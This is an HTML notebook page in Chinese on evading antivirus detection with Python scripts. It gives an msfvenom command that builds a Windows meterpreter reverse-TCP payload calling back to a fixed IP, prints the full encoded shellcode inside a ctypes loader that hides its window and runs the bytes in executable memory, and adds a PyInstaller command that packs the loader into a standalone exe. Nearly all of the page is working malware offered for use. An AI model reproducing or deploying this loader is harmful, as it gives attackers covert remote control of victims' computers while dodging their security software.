<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>python脚本免杀</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>python脚本免杀</h1><br/><a href="https://mp.weixin.qq.com/s/7f7asKdtpu6Us7bA1b3kEA">https://mp.weixin.qq.com/s/7f7asKdtpu6Us7bA1b3kEA</a><br /><br /><br />在kali下生成一个反弹的msf的python脚本,命令如下<br />msfVENOM -p windows/x64/meterpreter/reverse_tcp LPORT=1234 LHOST=10.16.155.223  -e x86/shikata_ga_nai -i 17 -f py -o  /root/223-1234.py<br /><br />编辑python脚本，使脚本可在windows中运行，在shellcode和首尾加如下代码：<br /><br /><div class="codebox"><div class="codebox">from&nbsp;ctypes&nbsp;import&nbsp;*<br /><br />import&nbsp;ctypes&nbsp;<br /><br />buf&nbsp;=&nbsp;&nbsp;&quot;&quot;<br />buf&nbsp;+=&nbsp;&quot;\xda\xd6\xb8\x1e\x13\xc0\x94\xd9\x74\x24\xf4\x5f\x29&quot;<br />buf&nbsp;+=&nbsp;&quot;\xc9\xb1\xec\x31\x47\x19\x83\xc7\x04\x03\x47\x15\xfc&quot;<br />buf&nbsp;+=&nbsp;&quot;\xe6\x1b\x46\xbe\xf5\x36\xfc\x4a\xdc\x33\x27\x46\x87&quot;<br />buf&nbsp;+=&nbsp;&quot;\x92\xee\x17\xdd\xd4\x80\x4d\x1d\x67\x7b\xf2\xc9\x7b&quot;<br />buf&nbsp;+=&nbsp;&quot;\x99\xfd\x1e\xe1\x3a\x7e\x6c\xaa\x82\x3a\x94\x7b\xbc&quot;<br />buf&nbsp;+=&nbsp;&quot;\x58\x56\xd5\x4c\xd9\x9c\xda\xb3\x9b\x95\x39\xb3\x37&quot;<br />buf&nbsp;+=&nbsp;&quot;\x1f\xb0\xe3\x1c\x33\x99\x28\x3e\x55\xbf\xbc\x57\x2c&quot;<br />buf&nbsp;+=&nbsp;&quot;\x68\x91\x08\xc7\xb4\xb2\x6c\xfe\xe3\x51\xd9\x85\x29&quot;<br />buf&nbsp;+=&nbsp;&quot;\x3d\x81\xf4\xc2\x88\x42\xf1\xc1\xf8\x9a\x73\x01\x02&quot;<br />buf&nbsp;+=&nbsp;&quot;\x42\x59\x26\xf5\x6c\x35\x1f\x3a\x50\x71\xbd\x23\x9b&quot;<br />buf&nbsp;+=&nbsp;&quot;\xf0\xc7\xbc\x6c\x09\xa6\x5b\x54\x22\xee\x51\x34\x7d&quot;<br />buf&nbsp;+=&nbsp;&quot;\x7c\x5e\x2d\xce\xa4\x8f\xf9\x69\x17\x60\x62\x68\x05&quot;<br />buf&nbsp;+=&nbsp;&quot;\x3f\x41\x43\x90\x50\x9b\xd3\x0b\x94\x77\x3c\x84\x9f&quot;<br />buf&nbsp;+=&nbsp;&quot;\xeb\x0c\x42\x55\x6a\xb7\x32\x66\x92\x72\xce\x1c\x11&quot;<br />buf&nbsp;+=&nbsp;&quot;\xc0\x71\x4f\xe0\xf5\xa5\x73\x1b\x12\x4e\xe4\x5b\x3f&quot;<br />buf&nbsp;+=&nbsp;&quot;\x57\xb3\x12\x3f\x39\x1e\x50\x06\xdc\xae\xec\xa2\x10&quot;<br />buf&nbsp;+=&nbsp;&quot;\x01\x71\x54\xad\xa5\x49\xde\x79\x13\x25\x82\x14\xb4&quot;<br />buf&nbsp;+=&nbsp;&quot;\xa7\xb4\xdd\xad\x6c\x72\x00\x03\x99\xe3\xa3\x56\x90&quot;<br />buf&nbsp;+=&nbsp;&quot;\x44\x5f\xdf\x37\xc6\x8c\xf8\x5f\xba\x7d\x57\xd7\x43&quot;<br />buf&nbsp;+=&nbsp;&quot;\x86\x20\x55\x9e\x09\x9a\x69\x78\x19\x34\x61\x6d\xdf&quot;<br />buf&nbsp;+=&nbsp;&quot;\x0c\x02\x61\x14\xfd\x68\x04\x6e\xd4\x68\x27\x2a\xc4&quot;<br />buf&nbsp;+=&nbsp;&quot;\xea\x01\x8d\xed\x33\x67\x43\xa2\x1c\x48\x96\xbd\x90&quot;<br />buf&nbsp;+=&nbsp;&quot;\x64\x27\x6f\x0b\xda\xd3\x19\x15\x61\x38\x68\xfb\x5e&quot;<br />buf&nbsp;+=&nbsp;&quot;\xb7\xfd\x93\x82\x39\x87\xd9\x3c\xa1\xab\x2b\x99\x54&quot;<br />buf&nbsp;+=&nbsp;&quot;\x69\xc1\x75\xa5\x95\xcd\xf5\x2c\xe1\xdd\x92\x8b\x28&quot;<br />buf&nbsp;+=&nbsp;&quot;\xe2\xbf\x15\x23\x20\xfd\x2b\x57\x5c\x0c\x7c\x4f\x56&quot;<br />buf&nbsp;+=&nbsp;&quot;\x66\xa4\x71\xe8\x66\x2e\xf9\x4c\xd1\xcc\x22\x11\xd5&quot;<br />buf&nbsp;+=&nbsp;&quot;\x62\xfc\xf4\xde\x7c\x64\xbe\x3c\x12\xee\xd6\x7b\xcb&quot;<br />buf&nbsp;+=&nbsp;&quot;\x25\x24\xe8\x4f\x38\xf5\x2b\xd8\x73\x4b\x4a\x86\x36&quot;<br />buf&nbsp;+=&nbsp;&quot;\x2f\xf2\xae\xfc\x5c\x06\x05\xf8\x3c\x42\x61\xa1\x70&quot;<br />buf&nbsp;+=&nbsp;&quot;\x9a\xfc\xe9\x74\x02\x78\xac\x09\x2f\x3b\xf4\x24\x35&quot;<br />buf&nbsp;+=&nbsp;&quot;\x07\x4f\xe9\xe3\xfb\x02\xee\xcb\xdc\x23\x89\xef\x32&quot;<br />buf&nbsp;+=&nbsp;&quot;\x73\x97\x17\x54\x89\x3a\xcc\x81\x4a\x4c\xf5\xe8\x77&quot;<br />buf&nbsp;+=&nbsp;&quot;\xe1\x5c\x12\x7d\xeb\x38\x64\x98\xf9\xd4\x9b\x19\x2d&quot;<br />buf&nbsp;+=&nbsp;&quot;\xdf\x50\x4e\x3b\xce\x3c\x12\xf0\x6c\xc3\xd2\x33\xde&quot;<br />buf&nbsp;+=&nbsp;&quot;\x9c\x27\x94\x25\xad\xdd\x92\x48\x01\x6d\x39\xaa\x68&quot;<br />buf&nbsp;+=&nbsp;&quot;\x9d\x75\xae\xd3\x83\x20\x8a\x5a\x1b\x60\x5f\xc0\x7d&quot;<br />buf&nbsp;+=&nbsp;&quot;\x61\xed\xf2\x10\x69\xf1\x8a\xbd\x98\x1a\xd8\xd4\x1a&quot;<br />buf&nbsp;+=&nbsp;&quot;\x56\x42\x6d\x3f\xfe\xaf\xae\xfa\x9b\x10\x50\x91\x94&quot;<br />buf&nbsp;+=&nbsp;&quot;\x76\x0a\x48\xdb\xb1\xb5\x55\x5a\x6a\x9a\x19\xc4\x23&quot;<br />buf&nbsp;+=&nbsp;&quot;\xb2\x5c\x84\xe0\x46\x6f\xc0\x51\x1d\x4c\xf9\x56\x59&quot;<br />buf&nbsp;+=&nbsp;&quot;\x62\xf2\x9b\x3d\x4c\x65\xf0\x15\x82\x4e\xe2\x6f\x69&quot;<br />buf&nbsp;+=&nbsp;&quot;\xcb\x74\xa9\x71\xa2\xf8\x75\x84\x5a\x13\x62\x82\x7d&quot;<br />buf&nbsp;+=&nbsp;&quot;\xb8\xdf\x21\xb1\xcc\xd6\xc4\xa9\x53\x14\x45\x81\x08&quot;<br />buf&nbsp;+=&nbsp;&quot;\x5a\xb9\xc3\x14\xb9\xc3\x9d\x53\x94\xf9\x62\x5a\x44&quot;<br />buf&nbsp;+=&nbsp;&quot;\xa9\x55\x09\x5c\x53\x88\xe6\x09\x21\xfb\x42\x86\xca&quot;<br />buf&nbsp;+=&nbsp;&quot;\x5b\x85\x61\x0d\x64\x23\x64\xb1\x14\x08\x7f\x3f\x2e&quot;<br />buf&nbsp;+=&nbsp;&quot;\xce\xb0\x03\xf5\x70\x46\x36\xea\x64\xab\xf0\x20\x02&quot;<br />buf&nbsp;+=&nbsp;&quot;\xbc\xeb\x59\xee\xcf\xc4\x97\x79\x4c\xc0\x55\x36\x3a&quot;<br />buf&nbsp;+=&nbsp;&quot;\x06\x8f\xcc\x90\x08\x05\xbb\x1b\x0f\x7a\x06\x77\x06&quot;<br />buf&nbsp;+=&nbsp;&quot;\x53\x60\xeb\x7c\x4c\x2a\x0e\xc7\xd6\x92\x3a\x5a\x8f&quot;<br />buf&nbsp;+=&nbsp;&quot;\xa3\x61\xa5\x08\xfd\xa4\xe0\x78\x42\xb4\xad\xaa\x8a&quot;<br />buf&nbsp;+=&nbsp;&quot;\x3e\x66\x1f\xf8\xe7\xf5\xaf\x2e\xa9\x6b\xee\xe5\x54&quot;<br />buf&nbsp;+=&nbsp;&quot;\x10\x75\x89\xe0\xcc\x74\x7d\x9c\x59\xd7\x9e\x65\x13&quot;<br />buf&nbsp;+=&nbsp;&quot;\x07\x80\xe2\x49\x0a\x9b\xf4\xd9\x12\xef\x19\xf6\x3c&quot;<br />buf&nbsp;+=&nbsp;&quot;\x0f\x8f\x79\x9e\xe5\xb4\x14\x53\xb0\xb4\x17\x3b\x15&quot;<br />buf&nbsp;+=&nbsp;&quot;\x2d\x7d\xa6\x70\x13\x87\xc7\x61\x52\xb0\x48\x06\x90&quot;<br />buf&nbsp;+=&nbsp;&quot;\x72\xa9\x3b\xb2\x2d\x47\x8a\x12\x92\xc8\x86\xb8\xdd&quot;<br />buf&nbsp;+=&nbsp;&quot;\xa7\x70\x67\x03\x73\x0d\x26\x3f\x97\x64\x61\xac\xf2&quot;<br />buf&nbsp;+=&nbsp;&quot;\x04\x9e\x77\xfb\x34\xa5\x18\xe5\x62\x8d\xbf\x93\x36&quot;<br />buf&nbsp;+=&nbsp;&quot;\x9c\xd2\xa9\x2c\xd8\x14\x67\x47\xab\x4e\x83\x9e\xbf&quot;<br />buf&nbsp;+=&nbsp;&quot;\x23\x0c\x93\xc6\x49\x9f\xf9\x17\xa6\x8f\xd4\xcf\x3b&quot;<br />buf&nbsp;+=&nbsp;&quot;\x11\x62\xc3\xa2\x84\xa3\x84\x8b\x46\x02\x2a\x0f\x8d&quot;<br />buf&nbsp;+=&nbsp;&quot;\x03\x39\x2c\x89\xd7\x28\x5f\x96\x98\x26\x47\xbf\x86&quot;<br />buf&nbsp;+=&nbsp;&quot;\xed\xd3\x1a\x7c\x22\x14\x1b\xf3\xfa\xa3\x1f\x87\xa3&quot;<br />buf&nbsp;+=&nbsp;&quot;\xbc\x56\xb5\xb8\x83\xe5\x4c\xf3\x05\x4b\x4c\xc2\xe2&quot;<br />buf&nbsp;+=&nbsp;&quot;\xe0\x66\x39\xe7\x33\xce\x63\x70\x8b\x99\x86\xfc\xa3&quot;<br />buf&nbsp;+=&nbsp;&quot;\xb9\xdd\x1c\x9c\xd1\xc9\x58\xcb\x4b\xca\x6f\x84\xcd&quot;<br />buf&nbsp;+=&nbsp;&quot;\x20\xc0\x49\x89\xad\x98\xd9\x99\xe1\xa6\x0e\xf8\x70&quot;<br />buf&nbsp;+=&nbsp;&quot;\xc7\x5e\xb5\x21\x4a\xd2\x7a\x56\x0e\xea\xcd\xf3\x71&quot;<br />buf&nbsp;+=&nbsp;&quot;\x29\x37\xf3\xb8\xfc\xa2\x29\xc2\x2d\xf1\xb8\x63\x6c&quot;<br />buf&nbsp;+=&nbsp;&quot;\xab\xc8\xff\x92\x3e\xda\x86\x68\xda\x39\xa3\xdc\x83&quot;<br />buf&nbsp;+=&nbsp;&quot;\x6c\xb8\xf6\xc1\x1c\x29\x17\x87\x53\xac\xba\x95\xce&quot;<br />buf&nbsp;+=&nbsp;&quot;\xfc\xa1\x5d\x5d\xdb\xf7\xcc\x77\x49\xae\x2a\xda\xbf&quot;<br />buf&nbsp;+=&nbsp;&quot;\x36\xca\xec\x5a\x38\xf7\x97&quot;#libc&nbsp;=&nbsp;CDLL(&#39;libc.so.6&#39;)<br /><br />PROT_READ&nbsp;=&nbsp;1<br /><br />PROT_WRITE&nbsp;=&nbsp;2<br /><br />PROT_EXEC&nbsp;=&nbsp;4<br /><br />def&nbsp;executable_code(buffer):<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;buf&nbsp;=&nbsp;c_char_p(buffer)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;size&nbsp;=&nbsp;len(buffer)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;addr&nbsp;=&nbsp;libc.valloc(size)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;addr&nbsp;=&nbsp;c_void_p(addr)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;0&nbsp;==&nbsp;addr:&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;Exception(&quot;Failed&nbsp;to&nbsp;allocate&nbsp;memory&quot;)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;memmove(addr,&nbsp;buf,&nbsp;size)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;0&nbsp;!=&nbsp;libc.mprotect(addr,&nbsp;len(buffer),&nbsp;PROT_READ&nbsp;|&nbsp;PROT_WRITE&nbsp;|&nbsp;PROT_EXEC):<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;Exception(&quot;Failed&nbsp;to&nbsp;set&nbsp;protection&nbsp;on&nbsp;buffer&quot;)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;addr<br /><br />VirtualAlloc&nbsp;=&nbsp;ctypes.windll.kernel32.VirtualAlloc<br /><br />VirtualProtect&nbsp;=&nbsp;ctypes.windll.kernel32.VirtualProtect<br /><br />shellcode&nbsp;=&nbsp;bytearray(buf)<br /><br />whnd&nbsp;=&nbsp;ctypes.windll.kernel32.GetConsoleWindow()&nbsp;&nbsp;&nbsp;<br /><br />if&nbsp;whnd&nbsp;!=&nbsp;0:<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;1==1:<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ctypes.windll.user32.ShowWindow(whnd,&nbsp;0)&nbsp;&nbsp;&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ctypes.windll.kernel32.CloseHandle(whnd)<br /><br />memorywithshell&nbsp;=&nbsp;ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ctypes.c_int(len(shellcode)),<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ctypes.c_int(0x3000),<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ctypes.c_int(0x40))<br /><br />buf&nbsp;=&nbsp;(ctypes.c_char&nbsp;*&nbsp;len(shellcode)).from_buffer(shellcode)<br /><br />old&nbsp;=&nbsp;ctypes.c_long(1)<br /><br />VirtualProtect(memorywithshell,&nbsp;ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))<br /><br />ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buf,<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ctypes.c_int(len(shellcode)))<br /><br />shell&nbsp;=&nbsp;cast(memorywithshell,&nbsp;CFUNCTYPE(c_void_p))<br /><br />shell()</div></div><br /><br />使用pyinstaller-2.0将做好的pyshon脚本生成exe程序<br /><br />python PyInstaller.py --console --onefile  223-1234.py<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>